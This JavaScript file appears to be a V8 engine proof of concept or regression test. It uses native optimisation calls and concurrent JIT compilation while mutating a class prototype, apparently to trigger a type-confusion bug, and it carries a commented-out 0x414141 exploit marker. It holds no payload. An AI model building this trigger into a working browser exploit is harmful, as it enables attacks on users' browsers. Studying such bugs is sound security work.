let length = 10000;

function foo2(obj, proto, x,y) {
  obj.obj = proto;
  var z = 0;
  for (let i = 0; i < 1; i++) {
    for (let j = 0; j < x; j++) {
      for (let k = 0; k < x; k++) {
        z = y[k];
      }
    }

  }
  proto.b = 60//;0x414141 + x +z;
  return z;
}
class B {}
B.prototype.a = 1;
B.prototype.a = 2;
B.prototype.b = 1;
B.prototype.b = {};

function bar(x) {
  return x instanceof B;
}
var args = {obj: B.prototype};
var arr = new Array(length);
arr.fill(0);
%PrepareFunctionForOptimization(foo2);
foo2(args, B.prototype, 20, arr);
%OptimizeFunctionOnNextCall(foo2);
foo2(args, B.prototype, 10, arr);

%PrepareFunctionForOptimization(bar);
bar({a : 1});
%OptimizeFunctionOnNextCall(bar, "concurrent");
bar({b : 1});
console.log("long foo");
foo2(args, B.prototype, length, arr);
%DebugPrint(B.prototype);
for (key in B.prototype) {
  B.prototype[key] = 1;
}
